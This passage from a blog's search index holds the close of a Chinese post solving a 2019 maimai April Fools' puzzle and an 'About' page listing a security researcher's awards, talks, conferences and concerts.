\u003c怒槌～光吉猛修一部謎～\u003e","uri":"/posts/2019/maimai-april-fools-day/"},{"categories":["休閒娛樂 ACGN"],"content":"最終問題、「流れ星を読め」 一大堆的 tap、slide、break、both，不難看出就是前四題作為題目的符號。 題意是「照著流星讀出來」，也不難猜出就是所謂的 slide，剩下…把字對齊就行了~ 由於背景動畫也是各種晃晃晃晃晃、倒帶看了不少次… わから［な］い とぱ［ぞ］らいと ですぱれい［と］ せんたく［き］ 解出來的答案是「なぞとき」，寫成漢字為「謎解き」即本次活動主題~ 當時只剩第二問解不出來還想硬猜這題，結果居然是濁音\"ぞ\"怎麼猜啦QQQ . . . 嗯？你以為結束了嗎… 並沒有！ 當你把上述五問的答案填入網站除了會得到一些頭像/底版/稱號，還會多拿到五張圖片= = 由左至右分別是第一問至最終問題，好像有種 Dejavu… 沒錯！正是第一問列出來的八個仮名，把仮名照順序拼出來在網站中找到 さらなる謎(MASTER) 填入即可。 解出來的答案是「ながいき」，寫成漢字為「長生き」（長命），雖然是解出來，不過查了很久找不出捏他，或許是在暗示 maimai 會一直繼續下去吧～ 至此就差不多告一個段落、剩下的因為涉及 CHUNITHM、オンゲキ 兩個玩不到的人權，只能放棄（# ","date":"2019-04-02","objectID":"/posts/2019/maimai-april-fools-day/:5:0","tags":["音 Game","April Fools' Day"],"title":"[Maimai] 2019 愚人節解謎 \u003c怒槌～光吉猛修一部謎～\u003e","uri":"/posts/2019/maimai-april-fools-day/"},{"categories":["休閒娛樂 ACGN"],"content":"彩蛋 題外話 … 在解謎的過程中，在該網站上意外找到了source code的彩蛋XD ここにヒントはありませ（這裡沒有任何提示）。 笑死 ᕕ ( ᐛ ) ᕗ ","date":"2019-04-02","objectID":"/posts/2019/maimai-april-fools-day/:6:0","tags":["音 Game","April Fools' Day"],"title":"[Maimai] 2019 愚人節解謎 \u003c怒槌～光吉猛修一部謎～\u003e","uri":"/posts/2019/maimai-april-fools-day/"},{"categories":null,"content":"About Me Hi! This is Cyris (aka @yctseng1227), a newbie in Cybersecurity . Threat Researcher @ Trend Micro Member @ CTF Team MacacaHub ","date":"0001-01-01","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Interests Threat Hunting Network Security Competitive Programming Japanese Anime \u0026 Music Music Game Player: Maimai, DrumMania, beatmania IIDX FINAL FANTASY XIV (since 2022✨) ","date":"0001-01-01","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Awards HITCON Education Defense 2021, Finalist Taipei, Taiwan, Nov. 2021 全國資訊安全會議(CISC) CTF 個人賽, 嶄露頭角獎 Kaohsiung, Taiwan, Sep. 2020 T 貓盃全國資安基礎實務能力競賽 (大專院校組), 1st Place Online, May 2020 資安技能金盾獎 Finals, Finalist Taipei, Taiwan, Nov. 2019 ACM-ICPC Asia Taipei Regional Contest, Honorable Mention Taipei, Taiwan, Nov. 2018 National Collegiate Programming Contest (NCPC), Finalist Kaohsiung, Taiwan, Oct. 2018 全國大專 ITSA 盃程式設計桂冠挑戰大賽 (闖關組), Honorable Mention Tainan, Taiwan, May 2018 ACM-ICPC Asia Hua-Lien Regional Contest, Honorable Mention Hua-Lien, Taiwan, Nov. 2017 National Collegiate Programming Contest (NCPC), Finalist Kaohsiung, Taiwan, Oct. 2017 全國大專 ITSA 盃程式設計桂冠挑戰大賽 (闖關組), Finalist Taipei, Taiwan, May 2016 National Contest for Private Universities (NCPU), Finalist Taipei, Taiwan, Jul. 2016 ","date":"0001-01-01","objectID":"/about/:3:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Presentations [DECODE 2024] The Infinite Game: Against Earth Hundun and their Bear Corps Manila, Philippines Sep. 10, 2024 [Lecture @NKNUSH] 關於網路的資安大小事 Kaohsiung, Taiwan Sep. 27, 2021 [CISC 2021] Cloud Gaming System and Security Online Aug. 5, 2021 [CISC 2020 Training] 基礎網頁安全演練 feat. MacacaHub Kaohsiung, Taiwan Sep. 1, 2020 [Lecture @NUK] 那些關於寫程式的三兩事 Kaohsiung, Taiwan Dec. 11, 2018 ","date":"0001-01-01","objectID":"/about/:4:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Activities 行政院國家資通安全網路攻防演練, 攻擊手 May 2020 - Aug. 2020 AIS3 新型態資安暑期課程, 學員 Jul. 27 - Aug. 2, 2020 國立中山大學 資安社, 社員 \u0026 助教 Sep. 2019 - Aug. 2021 IOI Camp 程式解題競賽集訓營, 學員 Jan. 28 - Feb. 1, 2019 交大競技程式訓練冬令營 (NCTU PCCA), 學員 Jan. 16 - 20, 2017 國立高雄大學 競程社, 創社社長 Sep. 2017 - Aug. 2018 銘傳大學 賽碼研習社, 社員 Sep. 2015 - Aug. 2016 ","date":"0001-01-01","objectID":"/about/:5:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Conference Events DECODE PH 2024 (Speaker) Manila, Philippines HITCON Enterprise 2024 Taipei, Taiwan DEVCORE Conference 2023, 2025 Taipei, Taiwan HITCON CMT 2020, 2021, 2022, 2023, 2024 Taipei, Taiwan CYBERSEC 2020, 2021 Taipei, Taiwan SITCON 2020, 2021, 2022 Taipei, Taiwan COSCUP 2020, 2022 Taipei, Taiwan CISC 2019, 2020 (Lecturer \u0026 場務組), 2021 (Speaker) Kaohsiung, Taiwan MOPCON 2017, 2018, 2019, 2020, 2021 Kaohsiung, Taiwan ","date":"0001-01-01","objectID":"/about/:6:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Side Story: Live Journey Hoshimachi Suisei Live Tour 2024 “Spectra of Nova”（大阪） おおきにアリーナ舞洲, Japan Dec. 10, 2024 NieR：Orchestra Concert 12024 [the end of data] 台北流行音樂中心, Taiwan Jun. 1, 2024 BANG! ACG 音樂祭（Highlights: 酸欠少女さユり, 中川翔子） 台北花博公園爭豔館, Taiwan Dec. 23, 2023 Sam Smith Gloria 全球巡迴演唱會-台北站 台北小巨蛋, Taiwan Oct. 9, 2023 MAN WITH A MISSION World Tour 2023 ～WOLVES ON PARADE～ Zepp New Taipei, Taiwan Sep. 17, 2023 ","date":"0001-01-01","objectID":"/about/:7:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"About This Blog 目前以雜談為主，偶爾穿插點課程 or 競賽的心得。 ","date":"0001-01-01","objectID":"/about/:8:0","tags":null,"title":"About","uri":"/about/"}]